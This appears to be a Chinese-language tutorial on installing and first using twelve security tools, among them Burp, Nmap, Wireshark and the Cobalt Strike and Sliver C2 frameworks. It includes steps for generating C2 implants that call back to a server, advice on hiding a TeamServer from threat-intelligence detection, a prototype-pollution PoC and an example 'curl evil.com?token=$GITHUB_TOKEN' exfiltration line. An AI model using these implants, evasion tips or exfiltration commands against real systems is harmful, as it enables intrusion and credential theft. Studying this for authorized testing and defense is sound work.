## 1. Burp Suite：Web 渗透与中间人抓包瑞士军刀

### 1.1 是什么
Burp Suite 是 Web 安全渗透测试的行业绝对事实标准。它充当浏览器与目标 Web 服务器之间的**中间人代理（Man-in-the-Middle Proxy）**，让安全工程师能够实时拦截、观察、修改并重放每一个 HTTP/HTTPS 请求与响应。
- **核心模块**：Proxy（抓包与放行）、Repeater（请求手工重放与参数调试）、Intruder（定制化爆破与模糊测试 Fuzzing）、Decoder（Base64/URL/Hex 等常见编码即时转换）。

### 1.2 怎么装
1. **安装 Java 运行环境（JDK 17 或 21）**：
   - 访问 Oracle 官网或采用开源发行版（如 Eclipse Temurin）：
     ```bash
     # Ubuntu / Debian
     sudo apt update && sudo apt install openjdk-17-jdk -y
     ```
   - 终端验证：`java -version` 确认版本输出。
2. **下载并安装 Burp Suite Community（社区版完全免费）**：
   - 访问 PortSwigger 官网下载 Windows 安装包（`.exe`）或 Linux 安装脚本（`.sh`），一路默认下一步即可。

### 1.3 第一个操作：拦截并重放你的第一个 HTTP 请求
1. 打开 Burp Suite，点击进入 `Proxy` $\to$ `Intercept` 选项卡，确认默认状态为 `Intercept is on`。
2. 点击内置浏览器按钮 `Open Browser`（该浏览器已预先配置好代理与证书，无需手动配置系统代理）。
3. 在内置浏览器地址栏输入 `http://example.com` 并回车。
4. 回到 Burp 窗口，此时已成功截获该 HTTP 请求！点击 `Ctrl + R` 将其发送到 `Repeater`。
5. 切换到 `Repeater` 选项卡，点击左上角的 `Send` 按钮，右侧即可看到服务器返回的纯文本 HTTP 响应报文。

### 1.4 避坑指南
- ⚠️ **坑点 1：内置浏览器可以访问，但用自己日常使用的 Chrome/Firefox 打开网页全报“证书风险（HTTPS 错误）”**：
  - *原因*：HTTPS 数据经过了加密，Burp 必须充当伪造的根证书颁发机构。
  - *解法*：在配置了 127.0.0.1:8080 代理的浏览器中，直接访问 `http://burp`，点击右上角的 `CA Certificate` 下载 `cacert.der`。在浏览器设置中搜索“证书”，将其导入到**“受信任的根证书颁发机构”**并勾选信任。
- ⚠️ **坑点 2：点击网页后浏览器一直转圈圈白屏，无任何反应**：
  - *原因*：`Intercept is on` 开启时，每一个后台 AJAX 请求都会被强行挂起等待人工放行。
  - *解法*：点击一下 `Intercept is on` 将其切换为 `Intercept is off`，此时流量只记录到 HTTP history 列表而不阻断网页加载。

## 2. Git：安全武器库克隆与版本控制必备

### 2.1 是什么
Git 是全球通用的分布式版本控制系统。在网络安全领域，绝大部分开源渗透工具、PoC/EXP 脚本、漏洞靶场（如 Vulhub、SQLMap、Dirsearch）都托管在 GitHub 上。掌握 Git 是获取全球安全研究成果的第一道门槛。

### 2.2 怎么装
- **Windows**：
  - 使用 Windows 包管理器一键安装：
    ```powershell
    winget install --id Git.Git -e --source winget
    ```
  - 或从官网 `https://git-scm.com/download/win` 下载安装包。
- **Linux (Ubuntu / Kali)**：
  ```bash
  sudo apt update && sudo apt install git -y
  ```

### 2.3 第一个操作：克隆一个经典开源渗透工具
在命令行终端输入以下命令，将自动化 SQL 注入工具 SQLMap 下载至本地：
```bash
git clone --depth=1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py -h
```
（`--depth=1` 参数表示只克隆最新一次提交，可大幅节省下载时间与磁盘占用）。

### 2.4 避坑指南
- ⚠️ **坑点 1：克隆时报 `server certificate verification failed` 或 `Connection reset by peer`**：
  - *原因*：国内访问 GitHub 网络节点不稳定或本地 SSL 证书链异常。
  - *解法*：配置科学代理端口，例如本地开了代理（如 7890 端口）：
    ```bash
    git config --global http.proxy http://127.0.0.1:7890
    git config --global https.proxy http://127.0.0.1:7890
    ```
- ⚠️ **坑点 2：Windows 下载的 `.sh` 脚本在 Linux 下运行报错 `\r: command not found`**：
  - *原因*：Windows 默认将换行符转成了 CRLF，而 Linux 仅支持 LF。
  - *解法*：全局关闭 Git 的自动换行符转换：
    ```bash
    git config --global core.autocrlf false
    ```

## 3. Cobalt Strike (CS)：经典红队 C2 团队协同框架

### 3.1 是什么
Cobalt Strike 是红蓝对抗与高级持续性威胁（APT）模拟中最著名的商业级命令与控制（C2）平台。它采用 C/S（客户端/服务端）架构，多名红队操作员可以同时连接到部署在云端 VPS 上的 **TeamServer**，协同控制全网潜伏的 **Beacon** 木马，并支持灵活的 Malleable C2 Profile 流量伪装。

### 3.2 怎么装
> **前置要求**：仅限在授权安全演练与个人离线实验室内使用。
1. **服务端环境（建议 Linux VPS Ubuntu 20.04/22.04）**：
   - 安装 Java 11 或 17：`sudo apt install openjdk-11-jdk -y`
   - 将 CS 压缩包上传至 VPS 并解压：`tar -zxvf cobaltstrike.tar.gz && cd cobaltstrike`
   - 赋予执行权限：`chmod +x teamserver`
2. **启动 TeamServer**：
   ```bash
   # 语法：./teamserver <VPS公网IP> <团队密码> [Malleable_Profile路径]
   ./teamserver 1.2.3.4 MySecretPassword123!
   ```
3. **客户端运行（Windows/macOS）**：
   - 双击 `cobaltstrike.jar` 或执行 `cobaltstrike.bat` 启动 GUI，输入 TeamServer IP、端口 50050、用户名及设定的连接密码。

### 3.3 第一个操作：创建第一个 HTTP 监听器（Listener）
1. 客户端登录成功后，点击顶部菜单 `Cobalt Strike` $\to$ `Listeners`。
2. 点击下方 `Add` 按钮：
   - `Name`: `HTTP_Listener_Demo`
   - `Payload`: 选择 `Beacon HTTP`
   - `HTTP Hosts`: 填入 TeamServer 的公网 IP 或解析域名
   - `HTTP Port (C2)`: 默认 80（或自定义 8080）
3. 保存后，点击菜单 `Attacks` $\to$ `Packages` $\to$ `Windows Executable`，选择刚建好的监听器，一键生成免杀测试木马（`artifact.exe`）。

### 3.4 避坑指南
- ⚠️ **坑点 1：TeamServer 刚启动几分钟，VPS 就被各大威胁情报中心标记为恶意 IP**：
  - *原因*：使用默认的 50050 端口，且使用了 CS 默认内置的 SSL 自签名证书（包含固定的 Issuer 和 Serial Number，扫描器一扫即中）。
  - *解法*：修改默认端口（在 `teamserver` 脚本中更改 50050），使用 keytool 重新生成全新的伪造自签名 SSL 证书，并务必挂载前端重定向器（Redirector）隔离真实 TeamServer。
- ⚠️ **坑点 2：靶机运行 Beacon 后，在 CS 客户端无回显**：
  - *原因*：VPS 云服务商安全组未放行对应 Listener 的入站端口（如 80/443/8080），或者靶机自带出站防火墙阻断。

## 4. Sliver：现代跨平台 Go 语言开源 C2 框架

### 4.1 是什么
Sliver 是由 Bishop Fox 团队开发的现代开源跨平台（Windows / Linux / macOS）C2 框架，被誉为 Cobalt Strike 的下一代开源继任者。它完全基于 Go 语言编写，通信层原生支持 mTLS（双向 TLS 认证）、WireGuard、HTTP/HTTPS 及 DNS 隐蔽隧道，天生具备强对抗与跨平台生成优势。

### 4.2 怎么装
1. **服务端（Linux 一键脚本安装）**：
   ```bash
   curl -s https://sliver.sh/install | sudo bash
   ```
   安装后服务会自动启动并作为 systemd 后台守护运行。
2. **生成操作员配置并启动客户端**：
   ```bash
   # 在服务器上为操作员 alice 颁发专属通信配置
   sudo sliver-server operator --name alice --lhost 1.2.3.4 --save alice.cfg
   # 启动交互控制台
   sliver
   ```

### 4.3 第一个操作：生成并上线一个 Linux/Windows 会话型 Implant
1. 在 sliver 交互终端内输入：
   ```text
   # 生成连接到 1.2.3.4 的 mTLS 协议 Windows 64位无阶段载荷
   generate --mtls 1.2.3.4:8888 --os windows --arch amd64 --format exe --save /tmp/test_implant.exe
   ```
2. 开启对应的服务端监听器：
   ```text
   mtls --lport 8888
   ```
3. 在测试靶机上运行 `test_implant.exe`，Sliver 控制台瞬间弹出 `[*] Session ... active`，输入 `sessions -i <ID>` 即可进入靶机执行命令！

### 4.4 避坑指南
- ⚠️ **坑点 1：使用 HTTP/HTTPS 模式时生成木马报错或无法回连**：
  - *原因*：Sliver 的 HTTPS 监听器默认尝试使用 Let's Encrypt 自动申请合法证书，如果测试 IP 未绑定公网域名或 80 端口被占用，证书申请失败会导致监听器崩溃。
  - *解法*：测试环境下添加 `--skip-ca` 参数使用自签名证书，或直接采用轻量原生的 `--mtls` 监听。
- ⚠️ **坑点 2：跨平台交叉编译 Windows CGO 特性报错**：
  - *解法*：在 Linux 服务端安装 Mingw-w64 编译套件：`sudo apt install gcc-mingw-w64 -y`。

## 5. Python 3 与安全开发环境：攻防自动化脚本基石

### 5.1 是什么
Python 是网络安全领域无可替代的“胶水语言”。90% 以上的公开漏洞利用 PoC、批量打靶脚本（AWD 自动化武器库）、暴力破解工具和流量分析工具均使用 Python 编写。

### 5.2 怎么装
- **Windows**：
  - 访问官网下载 Python 3.10+ 安装包，**安装第一步务必勾选最下方的 `Add Python.exe to PATH`**（这是新手最容易遗漏的致命一步！）。
- **Linux (Ubuntu / Debian)**：
  ```bash
  sudo apt update && sudo apt install python3 python3-pip python3-venv -y
  ```

### 5.3 第一个操作：编写 5 行代码的 HTTP 自动化探测脚本
新建文件 `test_request.py`：
```python
import requests

# 发送一个 GET 请求并打印状态码与网页标题
response = requests.get('https://httpbin.org/get', timeout=5)
print(f"HTTP 响应状态码: {response.status_code}")
print(f"响应内容 JSON: {response.json()['headers']['User-Agent']}")
```
终端执行：
```bash
pip install requests
python test_request.py
```

### 5.4 避坑指南
- ⚠️ **坑点 1：Linux 下 pip 安装模块报错 `error: externally-managed-environment`**：
  - *原因*：现代 Linux（Debian 12 / Ubuntu 23+）为防止第三方包破坏系统级 Python 解释器，开启了 PEP 668 保护。
  - *解法*：标准安全工程实践是**创建虚拟环境（venv）**：
    ```bash
    python3 -m venv my_env
    source my_env/bin/activate
    pip install requests
    ```
- ⚠️ **坑点 2：`pip install` 速度极其缓慢或报超时失败**：
  - *解法*：永久切换为国内阿里云或清华大学开源镜像源：
    ```bash
    pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple
    ```

## 6. Docker：安全容器化与漏洞靶场秒级编排神器

### 6.1 是什么
Docker 是现代容器虚拟化技术的标杆。在网络安全学习中，最让新手痛苦的是“为了测试一个 10 年前的历史漏洞（如 Apache Struts2、Log4j2、Shiro），需要在本地安装配置复杂的数据库、低版本中间件与老旧依赖”。而使用 Docker 与开源漏洞库（如 **Vulhub**），只需一条命令就能在 30 秒内完整跑起一个真实易受害的独立靶场！

### 6.2 怎么装
- **Windows / macOS**：
  - 从官网下载安装 **Docker Desktop**（Windows 依赖 WSL2 架构，安装前需开启电脑虚拟化与 WSL2）。
- **Linux (一键脚本极速安装)**：
  ```bash
  curl -fsSL https://get.docker.com | bash -s docker
  # 将当前非 root 用户加入 docker 用户组，避免每次都敲 sudo
  sudo usermod -aG docker $USER
  ```

### 6.3 第一个操作：启动经典 Web 漏洞综合练习靶场（DVWA）
在终端中执行：
```bash
docker run -d -p 8081:80 --name my_dvwa vulnerables/web-dvwa
```
打开本地浏览器访问 `http://127.0.0.1:8081`，点击最下方的 `Create / Reset Database`，一秒进入全套 Web 漏洞演练实战环境！

### 6.4 避坑指南
- ⚠️ **坑点 1：国内 Docker 镜像拉取一直卡在 `pulling fs layer` 随后报错超时**：
  - *原因*：国际网络阻断导致默认官方 Docker Hub 镜像源无法直连。
  - *解法*：在 `/etc/docker/daemon.json`（Windows 在 Docker Desktop 设置中的 Docker Engine）配置可靠的国内加速镜像代理源并重启 docker 服务。
- ⚠️ **坑点 2：启动容器报错 `port is already allocated`**：
  - *原因*：宿主机的目标端口（如 80 或 3306）已被本地安装的 IIS、Apache 或 MySQL 占用。
  - *解法*：修改 `-p` 参数左侧的宿主机映射端口，例如 `-p 8088:80`。

## 7. Nmap：全网主机存活、端口与服务指纹探测神器

### 7.1 是什么
Nmap（Network Mapper）是网络安全界无可争议的侦察之王。它通过精心构造并发送不同标志位的原始 IP 报文（TCP SYN、ACK、FIN、UDP），分析目标主机的回包行为，精准推断全网在线主机、开放的端口号、后端真实运行的服务软件版本（如 `Apache 2.4.49`）乃至底层的操作系统类型。

### 7.2 怎么装
- **Kali Linux**：系统默认原生内置，开箱即用。
- **Ubuntu / Debian**：`sudo apt update && sudo apt install nmap -y`
- **Windows**：访问 `https://nmap.org/download.html` 下载包含图形界面（Zenmap）的安装程序。

### 7.3 第一个操作：探测目标服务器端口与软件指纹
在授权测试的目标 IP 上执行：
```bash
# -sS: 高速 SYN 半开放扫描 (动静小、速度快)
# -sV: 版本指纹识别 (探测开放端口上运行的具体软件及版本号)
# -p: 指定扫描端口范围
# -Pn: 禁用 ICMP 存活探测 (防止目标防火墙禁 Ping 导致误报离线)
sudo nmap -sS -sV -Pn -p 22,80,443,3306,8080 127.0.0.1
```

### 7.4 避坑指南
- ⚠️ **坑点 1：普通用户运行 `nmap -sS` 报错 `You requested a scan type which requires root privileges`**：
  - *原因*：SYN 半开放扫描不需要完成三次握手，依赖底层的原始套接字（Raw Socket）发包，必须拥有操作系统最高管理员特权。
  - *解法*：在命令前增加 `sudo` 执行。
- ⚠️ **坑点 2：扫外网目标全显示 `filtered`，没有任何开放端口**：
  - *原因*：目标边界部署了防火墙（丢弃了探测包），或者你使用了默认扫描速度 `-T4` 发包频率过高被目标云服务器安全策略自动加入临时黑名单。
  - *解法*：适当降低发包速度（`-T2` 或 `-T3`），并针对性尝试常用出网端口（80/443）。

## 8. Seay 源代码审计系统：经典 PHP 白盒代码漏洞挖掘工具

### 8.1 是什么
Seay 是国内安全研究员针对 PHP 开发的一款经典自动化静态代码白盒审计（SAST）工具。它通过内置的大量正则匹配规则，能够在一秒内快速通扫整套开源 CMS 源码，定位高危函数（如 SQL 执行 `mysql_query`、命令执行 `system`/`exec`、文件包含 `include` 等 Sink 点），并提供变量回溯调试与代码高亮视图。

### 8.2 怎么装
1. **环境依赖**：Seay 基于 C# 开发，运行依赖 **Microsoft .NET Framework 4.5 或更高版本**（Windows 10/11 通常已默认集成）。
2. **下载运行**：
   - 从开源社区或安全归档库下载绿色版压缩包，直接解压。
   - 双击运行 `Seay源代码审计系统.exe` 即可启动图形界面，无需任何复杂安装步骤。

### 8.3 第一个操作：快速通扫一套开源源码
1. 点击顶部菜单栏的 `新建项目`，选择包含 PHP 源码的目标文件夹。
2. 点击上方快捷工具栏中的 `自动化审计` 按钮。
3. 在弹出的配置框中勾选常见漏洞类型（SQL注入、代码执行、文件包含、任意文件上传等），点击 `开始审计`。
4. 审计完成后，下方列表会集中罗列所有命中高危函数的代码行数，双击任意条目，右侧窗口即可自动联动定位到具体代码行并高亮显示！

### 8.4 避坑指南
- ⚠️ **坑点 1：通扫出来上千条“漏洞结果”，逐个排查发现全是误报**：
  - *原因*：正则白盒扫描只能识别“危险函数名（Sink）”，无法自动分析外部变量（Source）从前端传入后是否经过了过滤函数（Sanitizer，如 `addslashes`、`intval`）。
  - *解法*：白盒工具仅用于快速缩小排查范围！正确的姿势是借助 Seay 的搜索功能，**双向回溯变量的传递路径**，确认参数是否真正受控。
- ⚠️ **坑点 2：打开非 UTF-8 编码的老旧源码时中文注释全部乱码**：
  - *解法*：先用 VS Code 批量将源码目录的编码转换为 UTF-8，再导入 Seay 审计。

## 9. hping3：底层 TCP/IP 原始报文定制与防火墙探测利器

### 9.1 是什么
hping3 是面向 TCP/IP 协议栈的底层报文组装与分析工具，被称为“带特异功能的 Ping”。普通系统 `ping` 只能发送 ICMP 回显报文；而 hping3 允许安全研究员自由构造任意协议头，自定义源 IP/源端口、目标端口、TCP 标志位（SYN, ACK, FIN, RST, PSH, URG）、报文序列号及载荷大小，是探测防火墙拦截规则、测试 IDS 检测能力及复现 SYN Flood 等攻击实验的核心武器。

### 9.2 怎么装
- **Kali Linux**：原生默认集成。
- **Ubuntu / Debian**：
  ```bash
  sudo apt update && sudo apt install hping3 -y
  ```

### 9.3 第一个操作：发送 3 个定制 SYN 探测报文
向目标 Web 服务器的 80 端口发送 3 个手工定制的 TCP SYN 报文，观察握手机制：
```bash
sudo hping3 -c 3 -S -p 80 127.0.0.1
```
- `-c 3`：发送 3 个数据包后停止。
- `-S`：显式设置 TCP 标志位为 **SYN**。
- `-p 80`：指定目标端口为 80。
- 若终端打印返回 `flags=SA`（SYN-ACK），证明目标端口开放；若返回 `flags=RA`（RST-ACK），证明端口关闭。

### 9.4 避坑指南
- ⚠️ **坑点 1：必须在管理员/Root 特权下运行**：
  - *原因*：与 Nmap 类似，定制底层 TCP/IP 首部涉及内核 raw socket 调用，非 root 用户会直接报 `Operation not permitted`。
- ⚠️ **法律红线警告**：
  - 严禁使用带有 `--flood`（全速发包不等待回包）或 `--rand-source`（伪造随机源 IP）的破坏性参数向未经授权的公网服务器测试，该行为属于直接违反《网络安全法》的拒绝服务攻击（DDoS）犯罪行为！

## 10. Wireshark：网络协议全流量分析显微镜

### 10.1 是什么
Wireshark 是全球最权威、使用最广泛的网络抓包与深层协议分析器。如果说 Burp Suite 专注于 Web 应用层（HTTP/HTTPS/WebSocket），那么 Wireshark 则覆盖了从物理链路层（以太网帧）、网络层（IP/ICMP/ARP）、传输层（TCP/UDP）到应用层的所有协议细节，是排查网络底盘问题、解密 TLS 会话以及分析恶意样本网络回连行为的“网络显微镜”。

### 10.2 怎么装
- **Windows**：
  - 从官网 `https://www.wireshark.org/download.html` 下载安装包。
  - **安装时务必确认勾选安装 `Npcap`（抓包驱动）**，若缺少驱动则无法捕获物理网卡流量。
- **Ubuntu / Debian**：
  ```bash
  sudo apt update && sudo apt install wireshark -y
  # 安装过程中提示是否允许非超级用户抓包，推荐选择 Yes
  ```

### 10.3 第一个操作：捕获并追踪一个 HTTP TCP 会话流
1. 打开 Wireshark，主界面双击你的主上网网卡（如 `以太网` 或 `WLAN`），抓包瞬间开始。
2. 打开浏览器访问任意非加密网站（如 `http://testphp.vulnweb.com`）。
3. 回到 Wireshark，在顶部显示过滤器输入栏输入过滤规则：
   ```text
   http
   ```
   按下回车，列表中原本混杂的海量流量被一秒过滤，仅显示 HTTP 请求与响应报文。
4. 选中其中任意一条请求，鼠标右键点击 `Follow` $\to$ `TCP Stream`（追踪 TCP 流）：
   - 弹出的窗口以红色高亮显示你发送的请求、蓝色高亮显示服务器的完整回包，会话全貌一览无余！

### 10.4 避坑指南
- ⚠️ **坑点 1：打开 Wireshark 网卡列表一片空白，提示没有权限**：
  - *解法*：在 Windows 下右键“以管理员身份运行”；在 Linux 下将当前用户加入 `wireshark` 组：
    ```bash
    sudo usermod -aG wireshark $USER
    newgrp wireshark
    ```
- ⚠️ **坑点 2：抓到的全是一片混乱的 TLSv1.2 / TLSv1.3 乱码密文，无法分析**：
  - *原因*：现代流量 95% 以上都是 HTTPS 加密流。
  - *解法*：在本地操作系统配置环境变量 `SSLKEYLOGFILE=C:\sslkeys.log`，然后在 Wireshark 的 `Preferences` $\to$ `Protocols` $\to$ `TLS` 中将 `(Pre)-Master-Secret log filename` 指向该文件，Wireshark 将自动利用实时密钥解密全部 HTTPS 流量为明文！

## 11. Node.js 与 npm：前端攻防、原型链污染与跨端逆向底座

### 11.1 是什么
Node.js 是基于 Chrome V8 引擎构建的服务端 JavaScript 运行环境，npm 是其自带的全球最大开源软件包管理器。在 Web 安全与 CTF 竞赛中，Node.js 不仅是原型链污染（Prototype Pollution）、模板引擎 SSTI、SSRF 的高频靶场语言，也是绝大多数现代逆向与脱壳工具（如微信小程序解包工具 `unveilr`、`wxappUnpacker`、Electron 逆向、Webpack 前端还原）的运行基础设施。

### 11.2 怎么装
- **Windows**：
  - 访问官网 `https://nodejs.org/` 下载并安装 **LTS（长期支持版，推荐 Node 20 或 22）**。
  - 安装时勾选“Automatically install the necessary tools”。
  - 验证安装：
    ```cmd
    node -v
    npm -v
    ```
- **Linux (Ubuntu / Kali，推荐 NodeSource 官方源)**：
  ```bash
  curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
  sudo apt install -y nodejs
  ```

### 11.3 第一个操作：运行你的第一个原型链污染 PoC
1. 在本地创建一个临时文件夹，新建测试脚本 `poc.js`：
   ```javascript
   // 验证 JavaScript 原型链机制：修改 Object.prototype 是否会污染所有全局对象
   const maliciousPayload = JSON.parse('{"__proto__": {"isAdmin": true}}');
   
   // 模拟脆弱的递归合并或直接赋值
   Object.assign({}, maliciousPayload);
   
   // 验证普通白纸对象是否凭空获得了特权属性
   const normalUser = {};
   console.log("当前用户是否为管理员:", normalUser.isAdmin); // 输出 true 则代表成功污染！
   ```
2. 在终端执行脚本：
   ```bash
   node poc.js
   ```
   终端成功输出 `当前用户是否为管理员: true`，直观见证了原型链污染对所有全局对象的无差别渗透！

### 11.4 避坑指南
- ⚠️ **坑点 1：`npm install` 极慢甚至报 `ETIMEDOUT` 网络超时**：
  - *原因*：npm 默认官方源位于海外，国内直连极不稳定。
  - *解法*：一键切换为国内华为/阿里云镜像源：
    ```bash
    npm config set registry https://registry.npmmirror.com
    ```
- ⚠️ **坑点 2：Linux 安装全局工具（`npm install -g`）报 `EACCES: permission denied` 权限错误**：
  - *原因*：全局目录默认为 `/usr/local/lib/node_modules`，普通用户无写入权限。
  - *解法*：严禁盲目 `sudo npm`！应配置用户专属的全局目录：
    ```bash
    mkdir -p ~/.npm-global
    npm config set prefix '~/.npm-global'
    echo 'export PATH=~/.npm-global/bin:$PATH' >> ~/.bashrc
    source ~/.bashrc
    ```

## 12. GitHub Actions：现代 CI/CD 自动化工作流与安全管道

### 12.1 是什么
GitHub Actions 是现代企业级持续集成与持续交付（CI/CD）的绝对核心基础设施。开发者在仓库中定义 YAML 格式的工作流文件，当有代码推送到仓库（`push`）或提交合并请求（`pull_request`）时，GitHub 会自动拉起一个云端虚拟容器（Runner）执行测试、代码打包与自动化安全审计。在软件供应链安全中，它是**投毒攻击（Pwn-Request / Poisoned Pipeline Execution, PPE）**与生产凭据外带的关键攻防战役主场。

### 12.2 怎么建：创建你的第一个安全自动化工作流
GitHub Actions 规定工作流文件必须放置于仓库根目录下的严格固定路径：`.github/workflows/`，文件扩展名为 `.yml` 或 `.yaml`。

1. 在你的项目或 CTF 工具库根目录下创建目录结构：
   ```bash
   mkdir -p .github/workflows
   ```
2. 新建最小可行安全审计工作流文件 `.github/workflows/security_check.yml`：
   ```yaml
   name: Automated-Security-Audit

   # 1. 触发事件：当主分支发生代码 push 或提交 PR 时触发
   on:
     push:
       branches: [ main, master ]
     pull_request:
       branches: [ main, master ]

   # 2. 权限最小化锁定（安全基线关键项）
   permissions:
     contents: read

   # 3. 具体执行的任务作业
   jobs:
     static-code-analysis:
       name: Static Code Scanner
       runs-on: ubuntu-latest  # 使用 GitHub 官方提供的干净临时 Ubuntu 运行器

       steps:
         # 步骤 1：从仓库拉取最新代码
         - name: Checkout Repository
           uses: actions/checkout@v4

         # 步骤 2：设置 Python 运行环境
         - name: Setup Python
           uses: actions/setup-python@v5
           with:
             python-version: '3.11'

         # 步骤 3：安装 Bandit 白盒静态代码安全扫描器
         - name: Install Security Linter
           run: |
             python -m pip install --upgrade pip
             pip install bandit

         # 步骤 4：对项目源码进行无死角漏洞扫描
         - name: Run Bandit Security Audit
           run: |
             bandit -r . -ll -ii -x ./.git,./tests
   ```

### 12.3 第一个操作：触发并查看云端自动化运行日志
1. 将编写好的 `.github/workflows/security_check.yml` 提交并推送到 GitHub 远程仓库：
   ```bash
   git add .github/workflows/security_check.yml
   git commit -m "feat: add automated security audit pipeline"
   git push origin main
   ```
2. 打开浏览器访问该 GitHub 仓库主页，点击顶部导航栏中的 **`Actions`** 选项卡。
3. 列表中会实时出现刚才触发的 `Automated-Security-Audit` 工作流，状态呈现为黄色旋转小圈（运行中）；
4. 点击进入该记录，可实时点开每一个 Step 观察云端 Runner 执行控制台输出的完整日志！

### 12.4 避坑指南与高危攻防陷阱
- ⚠️ **高危陷阱 1：`pull_request_target` 触发器导致的致命投毒提权（PPE）**：
  - *致命误区*：许多开源项目为了让外部贡献者的 PR 也能自动跑测试，使用了 `on: pull_request_target`，并且在后续步骤中执行了 `actions/checkout` 拉取了 PR 分支中不受信的代码！
  - *黑客利用*：外部攻击者只需在自己 Fork 的分支中修改测试脚本（如在 `package.json` 或构建脚本里插入 `curl evil.com?token=$GITHUB_TOKEN`），然后向主仓库提交 PR。由于 `pull_request_target` 会以**主仓库的高特权写权限（Write Token）和完整 Secrets 上下文**运行，攻击者直接实现全自动化投毒窃密！
  - *防御法则*：对于公共开源仓库，严禁在 `pull_request_target` 事件中直接签出未经验证的 PR 代码；若必须测试 PR 代码，必须使用沙箱隔离的 `pull_request` 触发器！
- ⚠️ **坑点 2：在日志输出中无意暴露敏感凭据**：
  - *解法*：GitHub 默认会对仓库 `Settings -> Secrets` 中配置的环境变量进行星号 `***` 遮盖，但在复杂脚本中避免使用 `echo "$SECRET_TOKEN"` 打印整个字符串，防止因反斜杠转义或 Base64 编码绕过脱敏机制造成外泄。
